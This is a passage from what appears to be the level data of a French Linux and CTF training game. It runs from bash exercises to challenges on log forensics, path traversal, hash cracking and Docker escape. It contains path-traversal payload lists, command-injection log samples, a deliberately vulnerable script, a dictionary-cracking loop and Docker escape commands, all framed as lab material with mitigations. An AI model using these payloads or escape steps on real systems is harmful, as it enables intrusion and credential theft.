    commands: ['if', 'test', 'echo', 'cat'],
    hints: [
      "`if [ -f /etc/passwd ]; then echo 'Existe'; fi`",
      "`if [ $VAR -gt 10 ]; then echo 'Plus grand que 10'; fi`",
      "`case $1 in start) echo start;; stop) echo stop;; *) echo inconnu;; esac`"
    ],
    fileSystem: {
      'check_system.sh': `#!/bin/bash
# Vérifications système avec conditions

TARGET_FILE="/etc/hosts"
THRESHOLD=90

# Test existence de fichier
if [ -f "$TARGET_FILE" ]; then
    echo "✓ $TARGET_FILE existe"
else
    echo "✗ $TARGET_FILE introuvable"
fi

# Test numérique
DISK_USAGE=$(df / | awk 'NR==2{print $5}' | tr -d '%')
if [ "$DISK_USAGE" -gt "$THRESHOLD" ]; then
    echo "Disque presque plein : \${DISK_USAGE}%"
elif [ "$DISK_USAGE" -gt 70 ]; then
    echo "Disque a surveiller : \${DISK_USAGE}%"
else
    echo "Disque ok : \${DISK_USAGE}%"
fi
`,
    },
    validation: [
      { type: 'command', value: 'cat check_system.sh', description: 'Lire le script de conditions' },
      { type: 'command', value: 'bash check_system.sh', description: 'Exécuter le script de vérification' }
    ],
    story: "🤔 Un script robuste prend des décisions. Sans conditions, un script crash au premier obstacle."
  },
  {
    id: 84,
    title: "Parsing d'arguments — getopts",
    difficulty: 'advanced',
    category: "Bash Avancé",
    objective: "Parser les arguments CLI avec getopts",
    description: "`getopts 'opts' var` parse les options court format (`-v`, `-f fichier`). `$OPTARG` contient la valeur de l'option. `$OPTIND` = index du prochain argument. Standard POSIX, inclus dans bash.",
    commands: ['getopts', 'bash', 'cat', 'chmod'],
    hints: [
      "`while getopts 'vf:h' opt; do case $opt in ...`",
      "`f:` signifie que `-f` attend un argument. `v` (sans `:`) est un flag booléen.",
      "Teste : `./script.sh -v -f monFichier.txt`"
    ],
    fileSystem: {
      'cli_tool.sh': `#!/bin/bash
# Outil CLI avec getopts

VERBOSE=false
FILE=""
OUTPUT="output.txt"

usage() {
    echo "Usage: $0 [-v] [-f fichier] [-o output]"
    echo "  -v : mode verbeux"
    echo "  -f : fichier d'entrée"
    echo "  -o : fichier de sortie (défaut: output.txt)"
    exit 1
}

while getopts 'vf:o:h' opt; do
    case $opt in
        v) VERBOSE=true ;;
        f) FILE="$OPTARG" ;;
        o) OUTPUT="$OPTARG" ;;
        h|?) usage ;;
    esac
done

if [ -z "$FILE" ]; then
    echo "Erreur : fichier d'entrée requis (-f)"
    usage
fi

$VERBOSE && echo "Mode verbeux activé"
echo "Fichier : $FILE → $OUTPUT"
`
    },
    validation: [
      { type: 'command', value: 'cat cli_tool.sh', description: 'Lire le script avec getopts' },
      { type: 'command', value: 'bash cli_tool.sh', description: 'Tester le script CLI' }
    ],
    story: "⚙️ Les outils professionnels acceptent des arguments. `getopts` est la méthode standard POSIX pour les scripts portables."
  },
  {
    id: 85,
    title: "Arrays et manipulation de données",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Utiliser les tableaux bash et les opérations sur strings",
    description: "Bash supporte les tableaux indexés (`arr=(a b c)`) et associatifs (`declare -A map`). Manipulation de strings : `${#var}` (longueur), `${var:0:5}` (substring), `${var/ancien/nouveau}` (remplacement).",
    commands: ['echo', 'declare', 'bash', 'cat'],
    hints: [
      "`arr=(foo bar baz); echo ${arr[1]}` → 'bar'",
      "`echo ${#arr[@]}` → nombre d'éléments",
      "`for item in ${arr[@]}; do echo $item; done` — itérer sur un array"
    ],
    fileSystem: {
      'arrays_demo.sh': `#!/bin/bash
# Démonstration des arrays bash

# Array indexé
SERVERS=("web01" "web02" "db01" "cache01")
echo "Nb serveurs : \${#SERVERS[@]}"
echo "Premier : \${SERVERS[0]}"
echo "Dernier : \${SERVERS[-1]}"

for server in "\${SERVERS[@]}"; do
    echo "Ping $server..."
done

# Array associatif
declare -A PORTS
PORTS["ssh"]=22
PORTS["http"]=80
PORTS["https"]=443

for service in "\${!PORTS[@]}"; do
    echo "$service -> port \${PORTS[$service]}"
done

# Manipulation de strings
URL="https://api.example.com/v2/users"
echo "Longueur : \${#URL}"
echo "Domaine  : \${URL#*//}"
echo "Protocole: \${URL%%://*}"
`
    },
    validation: [
      { type: 'command', value: 'cat arrays_demo.sh', description: 'Lire la démo des arrays' },
      { type: 'command', value: 'bash arrays_demo.sh', description: 'Exécuter la démo' }
    ],
    story: "📦 Les arrays bash permettent de gérer des listes de serveurs, d'IPs, de fichiers. Indispensable en administration système."
  },
  {
    id: 86,
    title: "Expressions régulières avec grep et sed",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Maîtriser les regex avec grep -E et sed",
    description: "`grep -E 'regex'` utilise les regex étendues. Quantificateurs : `+` (1+), `*` (0+), `?` (0 ou 1), `{n,m}` (n à m). Groupes : `(abc)`. `sed 's/pattern/replacement/g'` pour substitution.",
    commands: ['grep', 'sed', 'cat'],
    hints: [
      "`grep -E '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' ips.txt` — valider des IPs",
      "`grep -E '(ERROR|WARN|CRIT)' logs.txt` — filtrer plusieurs niveaux",
      "`sed 's/password=[^ ]*/password=REDACTED/g'` — masquer les mots de passe"
    ],
    fileSystem: {
      'mixed_data.txt': `admin@company.com
not-an-email
user@example.org
invalid@@domain
dev@subdomain.company.io
192.168.1.1
10.0.0.256
172.16.0.1
not-an-ip
ERROR: connexion refusée à 14:23:01
INFO: ping ok
WARN: CPU > 90%
CRITICAL: disque plein
DEBUG: requête traitée`,
      'logs_with_secrets.txt': `2024-01-15 login user=admin password=SecretPass123 ip=192.168.1.10
2024-01-15 query db=prod token=eyJhbGci... status=ok
2024-01-15 error user=root password=TotoRoot! msg=access denied`
    },
    validation: [
      { type: 'command', value: 'grep -E', description: 'Utiliser grep avec regex étendue' },
      { type: 'command', value: 'sed', description: 'Substitution avec sed' }
    ],
    story: "🔍 Les regex sont l'arme secrète de l'analyste. Filtrer 10 millions de lignes de logs en 2 secondes ? Regex + grep."
  },
  {
    id: 87,
    title: "Trap et gestion des signaux",
    difficulty: 'advanced',
    category: "Bash Avancé",
    objective: "Intercepter les signaux système avec trap",
    description: "`trap 'commande' SIGNAL` intercepte un signal et exécute une action. Signaux courants : `INT` (Ctrl+C), `TERM` (kill), `EXIT` (fin du script), `ERR` (erreur). Utilisé pour le nettoyage de ressources.",
    commands: ['trap', 'kill', 'bash', 'cat'],
    hints: [
      "`trap 'echo Nettoyage...; rm -f /tmp/monfichier' EXIT` — nettoyage en fin de script.",
      "`trap 'echo Ctrl+C intercepté; exit 0' INT` — gestion propre de Ctrl+C.",
      "`trap 'echo Erreur ligne $LINENO' ERR` — débogage des erreurs."
    ],
    fileSystem: {
      'resilient_script.sh': `#!/bin/bash
# Script avec gestion des signaux

LOCKFILE="/tmp/script.lock"
TMPFILE="/tmp/script_data.tmp"

# Nettoyage automatique à la sortie
cleanup() {
    echo "Nettoyage des fichiers temporaires..."
    rm -f "$LOCKFILE" "$TMPFILE"
    echo "✓ Nettoyage terminé"
}

# Interception des signaux
trap cleanup EXIT
trap 'echo "Interruption reçue, arrêt propre..."; exit 1' INT TERM

# Vérification de lock
if [ -f "$LOCKFILE" ]; then
    echo "⚠ Script déjà en cours (PID: $(cat $LOCKFILE))"
    exit 1
fi

echo $$ > "$LOCKFILE"
echo "Script PID: $$"
echo "Simule un travail long..."
sleep 30
echo "Travail terminé"
`
    },
    validation: [
      { type: 'command', value: 'cat resilient_script.sh', description: 'Lire le script avec trap' },
      { type: 'command', value: 'bash resilient_script.sh', description: 'Tester la gestion des signaux' }
    ],
    story: "🛡️ Un script professionnel ne laisse pas de déchets. `trap` garantit le nettoyage même en cas d'interruption."
  },
  {
    id: 88,
    title: "Awk — traitement de colonnes",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Maîtriser awk pour le traitement de données structurées",
    description: "`awk '{print $1, $3}'` affiche les colonnes 1 et 3. `awk -F: '{print $1}'` utilise `:` comme délimiteur. `awk 'NR>1 && $3>1000'` filtre par numéro de ligne et valeur. Blocs `BEGIN` et `END` pour l'init et le total.",
    commands: ['awk', 'cat'],
    hints: [
      "`awk -F: '{print $1}' /etc/passwd` — noms d'utilisateurs.",
      "`awk '{sum+=$2} END {print \"Total:\", sum}' data.txt` — somme d'une colonne.",
      "`awk 'NR%2==0' fichier.txt` — lignes paires uniquement."
    ],
    fileSystem: {
      'access_log.txt': `192.168.1.10 - GET /api/users 200 1523 0.045
10.0.0.5 - POST /api/login 401 342 0.012
185.220.101.5 - GET /admin 403 89 0.003
192.168.1.10 - GET /api/data 200 8921 0.234
10.0.0.5 - POST /api/login 200 512 0.018
185.220.101.5 - GET /api/users 200 1523 0.067
185.220.101.5 - POST /upload 200 0 1.234
185.220.101.5 - GET /shell.php 200 42 0.001`,
      'awk_cheatsheet.txt': `Commandes awk essentielles :
  awk '{print $1}'          : première colonne
  awk '{print NF}'          : nombre de champs par ligne
  awk '{print NR, $0}'      : numéro + ligne complète
  awk '/pattern/'           : lignes matchant le pattern
  awk '$3 > 1000'           : filtre sur valeur numérique
  awk '{sum+=$4} END{print sum}' : somme colonne 4
  awk -F, '{print $2}'      : délimiteur virgule (CSV)`
    },
    validation: [
      { type: 'command', value: 'awk', description: 'Utiliser awk pour analyser le log d\'accès' }
    ],
    story: "📊 `awk` est le tableur du terminal. Analyse des logs d'accès Apache en temps réel, stats par IP, total de bande passante — tout ça en une ligne."
  },
  {
    id: 89,
    title: "Sed avancé — transformations en masse",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Utiliser sed pour des transformations complexes de fichiers",
    description: "`sed -n 'p'` supprime l'affichage par défaut. `sed -n '5,10p'` affiche les lignes 5 à 10. `sed '/pattern/d'` supprime les lignes. `sed -i` modifie le fichier en place. Adressage : `/regex/`, `N,M`, `$` (dernière ligne).",
    commands: ['sed', 'cat', 'grep'],
    hints: [
      "`sed -n '1,5p' fichier.txt` — afficher les 5 premières lignes.",
      "`sed '/^#/d' config.txt` — supprimer les commentaires.",
      "`sed 's/\\b192\\.168\\.1\\./10.0.0./g'` — remplacer des IPs en masse."
    ],
    fileSystem: {
      'config_raw.txt': `# Fichier de configuration (à nettoyer)
# Auteur : admin
# Version : 1.0

server_host = 192.168.1.100    # ancien réseau
server_port = 8080
database_host = 192.168.1.200  # ancien réseau
database_port = 5432

# Section sécurité
password = toto123  # TODO: changer
api_key = sk-dev-12345  # clé de développement
debug = true  # à désactiver en prod
`,
      'sed_tasks.txt': `Tâches à effectuer sur config_raw.txt :
1. Supprimer toutes les lignes commençant par #
2. Remplacer 192.168.1. par 10.20.30.
3. Supprimer les commentaires inline ( # ...)
4. Changer debug = true en debug = false
5. Masquer les valeurs sensibles (password, api_key)`
    },
    validation: [
      { type: 'command', value: 'sed', description: 'Utiliser sed pour transformer le fichier de config' }
    ],
    story: "✂️ Un fichier de config legacy avec de vieilles IPs et des secrets en clair. `sed` pour tout nettoyer en une passe."
  },
  {
    id: 90,
    title: "Script de monitoring système",
    difficulty: 'advanced',
    category: "Bash Avancé",
    objective: "Écrire un script complet de monitoring qui agrège plusieurs métriques",
    description: "Un script de monitoring combine : CPU (`top -bn1`), RAM (`free -m`), disque (`df -h`), processus (`ps`), connexions réseau (`ss`). Les résultats sont formatés et envoyés en alerte si des seuils sont dépassés.",
    commands: ['top', 'free', 'df', 'ps', 'ss', 'awk', 'echo'],
    hints: [
      "`top -bn1 | grep 'Cpu' | awk '{print $2}'` — % CPU utilisé.",
      "`free -m | awk 'NR==2{printf \"%.1f%%\\n\", $3*100/$2}'` — % RAM utilisée.",
      "`df -h / | awk 'NR==2{print $5}'` — % disque utilisé sur /."
    ],
    fileSystem: {
      'monitor.sh': `#!/bin/bash
# Script de monitoring — complète les sections manquantes

ALERT_THRESHOLD_CPU=80
ALERT_THRESHOLD_MEM=85
ALERT_THRESHOLD_DISK=90

check_cpu() {
    local cpu=$(top -bn1 | grep 'Cpu' | awk '{print $2}' | cut -d. -f1)
    echo "CPU: \${cpu}%"
    [ "\${cpu:-0}" -gt "$ALERT_THRESHOLD_CPU" ] && echo "Alerte CPU > \${ALERT_THRESHOLD_CPU}%"
}

check_memory() {
    # TODO : implémenter avec free -m et awk
    echo "TODO: vérifier la RAM"
}

check_disk() {
    # TODO : implémenter avec df -h
    echo "TODO: vérifier le disque"
}

echo "=== Rapport monitoring $(date) ==="
check_cpu
check_memory
check_disk
echo "=== Processus top 5 CPU ==="
ps aux --sort=-%cpu | head -6
`
    },
    validation: [
      { type: 'command', value: 'cat monitor.sh', description: 'Lire le script de monitoring' },
      { type: 'command', value: 'bash monitor.sh', description: 'Exécuter le script de monitoring' }
    ],
    story: "📈 En production, le monitoring automatique détecte les anomalies avant que les utilisateurs ne les signalent. Ce script est le point de départ."
  },

  // ─── Niveaux 91-100 : CTF & Challenges ───────────────────────────────────────
  {
    id: 91,
    title: "CTF — Stéganographie & encodages",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Décoder des données cachées dans différents formats",
    description: "Les CTF utilisent souvent plusieurs encodages imbriqués. `xxd` affiche un dump hexadécimal. `base64 -d` décode du base64. `python3 -c` pour des décodages custom. Cherche les patterns : `==` (fin de base64), `0x` (hex).",
    commands: ['xxd', 'base64', 'python3', 'strings', 'cat'],
    hints: [
      "`xxd fichier.bin | head` — voir les premiers octets en hex.",
      "`base64 -d encoded.txt` — décoder si c'est du base64.",
      "`python3 -c \"print(bytes.fromhex('48656c6c6f'))\"` — hex vers ASCII."
    ],
    fileSystem: {
      'encoded_flag.txt': 'RkxBR3tiNHMzNjRfM3N0X2wxbl9zMWduM19kM3NfdGVjaG5pcXVlc19DVEYhfQ==',
      'hex_data.bin': '464c41477b6865785f74305f4153434949217d',
      'README.txt': `Challenge : trouver le flag caché dans ces fichiers.

encoded_flag.txt : semble encodé en base64
hex_data.bin     : données en hexadécimal

Indices :
- base64 decode → observe la sortie
- hex → ASCII : chaque paire = 1 caractère
- Format du flag : FLAG{...}`,
      'hint.py': `# Aide pour le décodage
# base64 : base64 -d encoded_flag.txt
# hex : python3 -c "print(bytes.fromhex(open('hex_data.bin').read().strip()).decode())"
`
    },
    validation: [
      { type: 'command', value: 'base64 -d', description: 'Décoder le fichier base64' },
      { type: 'command', value: 'xxd', description: 'Inspecter les données hex' }
    ],
    story: "🏴 Premier CTF ! Les flags sont cachés dans des encodages multiples. Commence par identifier le type d'encodage avant de décoder."
  },
  {
    id: 92,
    title: "CTF — Chiffrement César & ROT13",
    difficulty: 'intermediate',
    category: "CTF",
    objective: "Déchiffrer des messages ROT13 et César avec les outils bash",
    description: "ROT13 décale chaque lettre de 13 positions. `tr 'A-Za-z' 'N-ZA-Mn-za-m'` décode ROT13 en bash. Le chiffre de César utilise un décalage variable (1-25). `python3` permet de tester tous les décalages.",
    commands: ['tr', 'python3', 'echo', 'cat'],
    hints: [
      "`echo 'Guvf vf n grfg' | tr 'A-Za-z' 'N-ZA-Mn-za-m'` — décode ROT13.",
      "Pour César : teste tous les décalages avec python3 ou un script bash.",
      "Pattern du flag connu → cherche `FLAG{` dans les sorties décodées."
    ],
    fileSystem: {
      'message_rot13.txt': 'SYNTfpevcrq_pvcure_vf_abg_rapelcgvba}',
      'message_cesar.txt': 'IODJ_ohv_fkliiuhv_fodvvltxhv_vrqw_srxu_ohv_qxov}',
      'cesar_decoder.py': `#!/usr/bin/env python3
# Décodeur César — teste tous les décalages

message = open('message_cesar.txt').read().strip()

for shift in range(26):
    decoded = ''
    for c in message:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            decoded += chr((ord(c) - base - shift) % 26 + base)
        else:
            decoded += c
    print(f"Décalage {shift:2d}: {decoded}")
    if 'FLAG' in decoded:
        print(f"          ^^^ TROUVÉ ! Décalage = {shift}")
`
    },
    validation: [
      { type: 'command', value: 'tr', description: 'Décoder le message ROT13' },
      { type: 'command', value: 'python3 cesar_decoder.py', description: 'Brute-forcer le chiffre de César' }
    ],
    story: "🔐 La cryptographie classique, ça se casse vite. ROT13 en bash, César en Python — quelques secondes."
  },
  {
    id: 93,
    title: "CTF — Analyse de logs web",
    difficulty: 'intermediate',
    category: "CTF",
    objective: "Retrouver une attaque dans des logs Apache via des commandes bash",
    description: "Les logs Apache contiennent : IP, méthode HTTP, chemin, code réponse, taille. Analyse : identifier les IPs malveillantes, les chemins suspects (`/admin`, `/../`, `?cmd=`), les scans automatisés (user-agent Nikto/sqlmap).",
    commands: ['grep', 'awk', 'sort', 'uniq', 'cut', 'wc'],
    hints: [
      "`awk '{print $1}' access.log | sort | uniq -c | sort -rn | head` — top IPs.",
      "`grep -E '\\?.*cmd=|exec=|system=' access.log` — détection d'injection.",
      "`grep '404' access.log | awk '{print $7}' | sort | uniq -c | sort -rn` — chemins introuvables les plus scannés."
    ],
    fileSystem: {
      'access.log': `192.168.1.10 - - [15/Jan/2024:09:00:01] "GET /index.php HTTP/1.1" 200 4521 "Mozilla/5.0"
192.168.1.10 - - [15/Jan/2024:09:00:05] "GET /about.html HTTP/1.1" 200 1234 "Mozilla/5.0"
185.220.101.5 - - [15/Jan/2024:09:01:00] "GET /admin HTTP/1.1" 404 289 "Nikto/2.1.6"
185.220.101.5 - - [15/Jan/2024:09:01:01] "GET /admin/ HTTP/1.1" 403 289 "Nikto/2.1.6"
185.220.101.5 - - [15/Jan/2024:09:01:02] "GET /wp-admin HTTP/1.1" 404 289 "Nikto/2.1.6"
185.220.101.5 - - [15/Jan/2024:09:01:03] "GET /phpmyadmin HTTP/1.1" 404 289 "Nikto/2.1.6"
185.220.101.5 - - [15/Jan/2024:09:01:10] "GET /index.php?page=../../../etc/passwd HTTP/1.1" 200 2048 "curl/7.68"
185.220.101.5 - - [15/Jan/2024:09:01:15] "GET /index.php?cmd=id HTTP/1.1" 200 42 "curl/7.68"
185.220.101.5 - - [15/Jan/2024:09:01:20] "GET /index.php?cmd=cat+/etc/shadow HTTP/1.1" 200 1024 "curl/7.68"
192.168.1.20 - - [15/Jan/2024:09:05:00] "POST /contact HTTP/1.1" 200 512 "Mozilla/5.0"
10.0.0.5 - - [15/Jan/2024:09:10:00] "GET /api/users HTTP/1.1" 200 8921 "Python/3.8"`,
      'challenge_questions.txt': `Questions du CTF :
1. Quelle IP a effectué l'attaque ? → grep/awk
2. Combien de requêtes en 404 de l'attaquant ?
3. Quel outil de scan a été utilisé ? (User-Agent)
4. Quel fichier sensible a été accédé via path traversal ?
5. Quel code de commande a été injecté ?`
    },
    validation: [
      { type: 'command', value: 'grep', description: 'Filtrer les requêtes suspectes dans les logs' },
      { type: 'command', value: 'awk', description: 'Analyser les patterns d\'attaque' },
      { type: 'command', value: 'sort', description: 'Trier et compter les occurrences' }
    ],
    story: "🕵️ Un site a été attaqué. Les logs ne mentent pas. Remonte l'attaque pas à pas avec les commandes bash."
  },
  {
    id: 94,
    title: "CTF — Variables d'environnement et injection",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Comprendre et exploiter les injections via variables d'environnement",
    description: "Les variables d'environnement mal utilisées peuvent être dangereuses. `$()` ou backticks permettent l'injection de commandes si une variable n'est pas correctement échappée. `env` expose les variables accessibles à un processus.",
    commands: ['env', 'printenv', 'export', 'cat', 'bash'],
    hints: [
      "`env | grep -i 'pass\\|secret\\|key\\|token'` — chercher des secrets dans l'environnement.",
      "`printenv HOME` — valeur d'une variable spécifique.",
      "Un processus hérite de l'environnement de son parent — les secrets dans les variables sont visibles via /proc/PID/environ."
    ],
    fileSystem: {
      'vulnerable_app.sh': `#!/bin/bash
# Application vulnérable à l'injection via variable

# ATTENTION : ne JAMAIS faire ça en production !
USER_INPUT="$1"

# Mauvais pattern : variable non quotée dans eval
echo "Bienvenue $(echo $USER_INPUT)"

# Pattern sûr : toujours quoter les variables
# echo "Bienvenue \${USER_INPUT}"
`,
      'env_investigation.txt': `Secrets fréquemment exposés via variables d'environnement :
  DATABASE_URL=postgres://user:password@host/db
  AWS_SECRET_ACCESS_KEY=xxxxx
  JWT_SECRET=monsecret
  REDIS_PASSWORD=pass

Comment les trouver (si accès au système) :
  cat /proc/PID/environ | tr '\\0' '\\n'
  strings /proc/PID/environ
  env (dans le contexte du processus)

Bonne pratique : utiliser des gestionnaires de secrets
  (Vault, AWS Secrets Manager, etc.)`,
      'flag_in_env.sh': `#!/bin/bash
# Ce script cache un flag dans son environnement
export CTF_FLAG="FLAG{3nv_v4r5_4r3_n0t_s3cr3t}"
export DB_PASS="weak_password"
# Lance une sous-tâche...
bash -c 'env | grep CTF'`
    },
    validation: [
      { type: 'command', value: 'env', description: 'Lister les variables d\'environnement' },
      { type: 'command', value: 'bash flag_in_env.sh', description: 'Récupérer le flag via les variables d\'env' }
    ],
    story: "🌍 Un processus en production a des variables d'environnement suspectes. Si tu as accès au système, les secrets sont peut-être à portée."
  },
  {
    id: 95,
    title: "CTF — Path traversal et lecture de fichiers",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Comprendre la vulnérabilité path traversal et l'identifier dans des logs",
    description: "Le **path traversal** (`../../../etc/passwd`) exploite une mauvaise validation de chemin. `cat` et `find` permettent de lire et naviguer dans le système. Identifier : chemins avec `../`, encodage URL `%2e%2e`, null bytes.",
    commands: ['find', 'cat', 'grep', 'ls'],
    hints: [
      "`find / -name '*.conf' -readable 2>/dev/null` — fichiers de config lisibles.",
      "`cat /proc/self/environ` — variables d'environnement du processus courant.",
      "`grep -r 'FLAG{' /home/ /tmp/ /var/www/ 2>/dev/null` — chercher le flag."
    ],
    fileSystem: {
      'web_root': {
        'index.php': '<?php echo "Bienvenue"; ?>',
        'config.php': '<?php $db_pass = "FLAG{p4th_tr4v3rs4l_1s_d4ng3r0us}"; ?>',
        'uploads': {
          'photo.jpg': '[IMAGE]'
        }
      },
      'traversal_patterns.txt': `Patterns de path traversal à détecter (dans les logs) :
  ../../../etc/passwd
  ....//....//etc/passwd  (double encodage)
  %2e%2e%2f%2e%2e%2f     (URL encoding)
  ..%c0%af..%c0%af        (overlong UTF-8)
  /var/www/html/../../etc/passwd

Fichiers cibles courants :
  /etc/passwd        : liste des utilisateurs
  /etc/shadow        : hashes des mots de passe
  ~/.ssh/id_rsa      : clé privée SSH
  /proc/self/environ : variables d'env du processus web`
    },
    validation: [
      { type: 'command', value: 'cat web_root/config.php', description: 'Lire le fichier config.php' },
      { type: 'command', value: 'find web_root', description: 'Explorer l\'arborescence web' }
    ],
    story: "🗂️ L'application web inclut des fichiers sans valider le chemin. Explore l'arborescence pour trouver le flag."
  },
  {
    id: 96,
    title: "CTF — Forensic mémoire et /proc",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Extraire des informations depuis le pseudo-filesystem /proc",
    description: "`/proc` expose l'état du système en temps réel. `/proc/self` = le processus courant. `/proc/PID/maps` = carte mémoire. `/proc/PID/cmdline` = commande lancée. `/proc/PID/fd/` = descripteurs de fichiers ouverts.",
    commands: ['cat', 'ls', 'find', 'grep', 'strings'],
    hints: [
      "`ls /proc/` — liste les PIDs actifs + infos système.",
      "`cat /proc/self/cmdline | tr '\\0' ' '` — commande du processus courant.",
      "`find /proc -name 'cmdline' -readable 2>/dev/null | head -5` — commandes de tous les processus."
    ],
    fileSystem: {
      'proc_cheatsheet.txt': `/proc — référence rapide :

  /proc/version       : kernel + compilateur
  /proc/cpuinfo       : infos CPU
  /proc/meminfo       : infos RAM
  /proc/net/tcp       : connexions TCP (format hex)
  /proc/PID/cmdline   : commande du processus
  /proc/PID/environ   : variables d'environnement
  /proc/PID/maps      : carte mémoire
  /proc/PID/fd/       : fichiers ouverts (liens symboliques)
  /proc/PID/net/      : état réseau du namespace

Astuce forensic : même si un fichier est "supprimé",
il reste accessible via /proc/PID/fd/N tant que le
processus l'a ouvert.`,
      'deleted_secret.txt': 'FLAG{/pr0c_1s_4_g0ldm1n3_f0r_f0r3ns1c}'
    },
    validation: [
      { type: 'command', value: 'cat /proc', description: 'Explorer le pseudo-filesystem /proc' },
      { type: 'command', value: 'cat proc_cheatsheet.txt', description: 'Lire la référence /proc' }
    ],
    story: "🧠 Le système Linux expose son état via /proc. Un forensicien y lit les commandes en cours, les connexions, et même des fichiers supprimés."
  },
  {
    id: 97,
    title: "CTF — Analyse binaire avec xxd et strings",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Extraire des données d'un fichier binaire inconnu",
    description: "`file` identifie le type d'un fichier (magic bytes). `xxd fichier | head` montre les premiers octets. `strings -n 8 fichier` extrait les chaînes de min 8 caractères. Le flag est souvent caché dans un binaire.",
    commands: ['file', 'xxd', 'strings', 'grep'],
    hints: [
      "`file unknown.bin` — identifie le vrai type du fichier (pas juste l'extension).",
      "`strings unknown.bin | grep 'FLAG'` — cherche directement le flag.",
      "`xxd unknown.bin | grep -A2 '4647'` — cherche 'FG' en hex (début de FLAG)."
    ],
    fileSystem: {
      'unknown.bin': `\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00
FLAG{str1ngs_r3v34l5_s3cr3ts}
config: debug=true
secret_key: hunter2
database: postgres://admin:admin@localhost/prod`,
      'fake_image.jpg': 'Not actually a JPEG - just renamed!',
      'analysis_notes.txt': `Analyser un fichier inconnu - méthodologie :
1. file unknown.bin        : type réel (ELF ? PDF ? Archive ?)
2. xxd unknown.bin | head  : magic bytes (premiers octets)
3. strings unknown.bin     : chaînes lisibles
4. grep FLAG strings.txt   : cherche le flag
5. binwalk unknown.bin     : fichiers cachés dans le binaire

Magic bytes courants :
  7f 45 4c 46 → ELF (Linux executable)
  ff d8 ff    → JPEG image
  50 4b 03 04 → ZIP archive
  25 50 44 46 → PDF`
    },
    validation: [
      { type: 'command', value: 'strings unknown.bin', description: 'Extraire les chaînes du binaire' },
      { type: 'command', value: 'xxd', description: 'Inspecter le contenu hexadécimal' }
    ],
    story: "🔬 Un fichier `unknown.bin` a été trouvé sur le serveur compromis. Pas d'extension fiable. Analyse-le pour en extraire des informations."
  },
  {
    id: 98,
    title: "CTF — Cryptographie : hash cracking",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Identifier et craquer des hashes avec les outils bash",
    description: "`sha256sum`, `md5sum`, `openssl dgst` génèrent des hashes. Pour identifier un hash : longueur + caractères (MD5=32 hex, SHA1=40, SHA256=64). Craquage par dictionnaire : `for word in $(cat wordlist.txt); do echo -n $word | sha256sum; done`.",
    commands: ['sha256sum', 'md5sum', 'openssl', 'echo', 'grep'],
    hints: [
      "`echo -n 'password' | md5sum` — hash MD5 du mot 'password'.",
      "`for w in $(cat wordlist.txt); do [ $(echo -n $w | sha256sum | cut -d' ' -f1) = '$HASH' ] && echo FOUND: $w; done`",
      "Longueur : MD5=32, SHA1=40, SHA256=64, SHA512=128 caractères hexadécimaux."
    ],
    fileSystem: {
      'hashes_to_crack.txt': `# Hashes récupérés depuis /etc/shadow (simulation)
admin:5f4dcc3b5aa765d61d8327deb882cf99  (MD5)
user1:aec070645fe53ee3b3763059376134f058cc337869c006edc3ae1e5f77af534d  (SHA256 ?)
flag_user:1a1dc91c907325c69271ddf0c944bc72  (MD5)`,
      'wordlist.txt': `password
password123
admin
root
letmein
qwerty
monkey
dragon
master
sunshine
princess
hello
flag
edulinux
linux
hacking`,
      'hash_identifier.py': `#!/usr/bin/env python3
# Identifier le type de hash

def identify_hash(h):
    length = len(h)
    if length == 32: return "MD5 probablement"
    if length == 40: return "SHA1 probablement"
    if length == 64: return "SHA256 probablement"
    if length == 128: return "SHA512 probablement"
    return "Inconnu"

hashes = open('hashes_to_crack.txt').readlines()
for line in hashes:
    if ':' in line and not line.startswith('#'):
        user, h = line.strip().split(':')
        print(f"{user}: {identify_hash(h)} ({len(h)} chars)")`
    },
    validation: [
      { type: 'command', value: 'echo -n', description: 'Générer un hash MD5 ou SHA256' },
      { type: 'command', value: 'md5sum', description: 'Vérifier un hash MD5' }
    ],
    story: "🔑 Des hashes ont été récupérés depuis le système compromis. Identifie leur type et tente un craquage par dictionnaire."
  },
  {
    id: 99,
    title: "CTF — Docker et isolation",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Comprendre l'isolation Docker et les vecteurs d'évasion",
    description: "Docker isole les processus via des namespaces Linux. Vecteurs d'évasion : **privileged mode** (`--privileged`), **montage de /host**, **socket Docker** accessible, **capabilities** dangereuses. `cat /proc/1/cgroup` révèle si on est dans un container.",
    commands: ['cat', 'find', 'ls', 'env'],
    hints: [
      "`cat /proc/1/cgroup` — lignes avec 'docker' = on est dans un container.",
      "`find / -name 'docker.sock' 2>/dev/null` — socket Docker accessible = évasion possible.",
      "`cat /.dockerenv` — fichier présent = on est dans un container Docker."
    ],
    fileSystem: {
      '.dockerenv': '',
      'container_check.sh': `#!/bin/bash
# Détection d'environnement container

echo "=== Détection container ==="

# Test 1 : fichier .dockerenv
if [ -f /.dockerenv ]; then
    echo "✓ .dockerenv trouvé → Docker container"
fi

# Test 2 : cgroups
if grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo "✓ cgroup docker → container confirmé"
fi

# Test 3 : hostname (souvent un hash dans Docker)
echo "Hostname: $(hostname)"

# Test 4 : socket Docker accessible
if [ -S /var/run/docker.sock ]; then
    echo "⚠ Socket Docker accessible → ÉVASION POSSIBLE"
fi
`,
      'docker_escape.txt': `Techniques d'évasion Docker (éducatif — lab uniquement) :

1. Privileged mode + /dev/sda
   docker run --privileged → monter le disque hôte
   mount /dev/sda1 /mnt && chroot /mnt

2. Socket Docker exposé
   curl --unix-socket /var/run/docker.sock http://v1.41/containers/json
   → créer un container privlegied avec montage /host

3. Montage de répertoire hôte sensible
   docker run -v /:/host → accès à tout le système hôte

4. SYS_ADMIN capability
   Permet de monter des filesystems et modifier les namespaces

Mitigation :
  - Ne jamais monter /var/run/docker.sock en prod
  - User namespace mapping
  - Seccomp profiles
  - AppArmor/SELinux`
    },
